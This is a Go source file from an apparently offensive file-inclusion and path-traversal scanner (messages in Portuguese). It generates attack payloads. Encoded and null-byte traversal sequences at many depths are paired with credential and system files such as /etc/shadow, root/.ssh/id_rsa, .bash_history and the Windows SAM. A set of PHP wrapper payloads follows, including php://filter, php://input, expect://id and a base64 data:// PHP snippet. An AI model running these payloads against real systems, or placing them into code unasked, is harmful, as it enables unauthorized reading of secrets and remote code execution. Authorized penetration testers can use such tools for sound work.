package main

import (
	"fmt"
	"os"
	"strings"
)

func loadPayloads(wordlistFile, osTarget string, level int) []Payload {
	if wordlistFile != "" {
		return loadPayloadsFromFile(wordlistFile)
	}
	return generateDefaultPayloads(osTarget, level)
}

func loadPayloadsFromFile(path string) []Payload {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Println(colorRed + "Erro ao ler wordlist: " + err.Error() + colorReset)
		os.Exit(1)
	}
	lines := strings.Split(string(data), "\n")
	var out []Payload
	for _, l := range lines {
		l = strings.TrimRight(l, "\r\n")
		l = strings.TrimSpace(l)
		if l == "" || strings.HasPrefix(l, "#") {
			continue
		}
		out = append(out, Payload{Value: l, Category: "custom"})
	}
	return out
}

func generateDefaultPayloads(osTarget string, level int) []Payload {
	var depths []int
	var seps []string
	extras := level >= 2

	switch level {
	case 1:
		depths = []int{3, 6}
		seps = []string{"/"}
	case 3:
		depths = []int{1, 2, 3, 4, 5, 6, 8, 10, 12, 15}
		seps = []string{"/", "\\", "%2f", "%5c"}
	default: 
		depths = []int{2, 4, 6, 8, 10}
		seps = []string{"/", "%2f"}
	}

	linuxFiles := []string{
		"etc/passwd", "etc/hosts", "etc/shadow", "etc/issue",
		"proc/self/environ", "proc/self/cmdline", "proc/self/status", "proc/version",
		"var/log/auth.log", "var/log/apache2/access.log", "var/log/apache2/error.log",
		"var/log/nginx/access.log", "var/log/nginx/error.log", "var/log/vsftpd.log",
		"var/log/mail.log", "root/.bash_history", "root/.ssh/id_rsa", "home/.bash_history",
	}

	windowsFiles := []string{
		"windows/win.ini", "windows/system.ini", "boot.ini",
		"windows/system32/drivers/etc/hosts", "windows/repair/sam",
		"windows/panther/unattend.xml", "xampp/apache/logs/access.log", "wamp/logs/access.log",
	}

	phpWrappers := []string{
		"php://filter/convert.base64-encode/resource=index",
		"php://filter/convert.base64-encode/resource=config",
		"php://filter/read=string.rot13/resource=index",
		"php://filter/convert.base64-encode/resource=../../../../etc/passwd",
		"php://input",
		"phar://test.phar/test.txt",
		"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
		"expect://id",
		"zip://test.zip#test.txt",
	}

	var payloads []Payload

	addTraversalCombos := func(files []string, category string) {
		for _, f := range files {
			payloads = append(payloads, Payload{Value: "/" + f, Category: category})
			payloads = append(payloads, Payload{Value: f, Category: category})
			for _, sep := range seps {
				for _, d := range depths {
					prefix := ""
					for i := 0; i < d; i++ {
						prefix += ".." + sep
					}
					payloads = append(payloads, Payload{Value: prefix + f, Category: category})
				}
			}
			if extras {
				payloads = append(payloads, Payload{Value: "../../../../../../../../" + f + "%00", Category: category})
				payloads = append(payloads, Payload{Value: "..%252f..%252f..%252f..%252f" + f, Category: category})
				payloads = append(payloads, Payload{Value: "..%c0%af..%c0%af..%c0%af..%c0%af" + f, Category: category})
			}
		}
	}

	if osTarget == "linux" || osTarget == "all" {
		addTraversalCombos(linuxFiles, "linux")
	}
	if osTarget == "windows" || osTarget == "all" {
		addTraversalCombos(windowsFiles, "windows")
	}

	for _, w := range phpWrappers {
		payloads = append(payloads, Payload{Value: w, Category: "php_wrapper"})
	}

	return payloads
}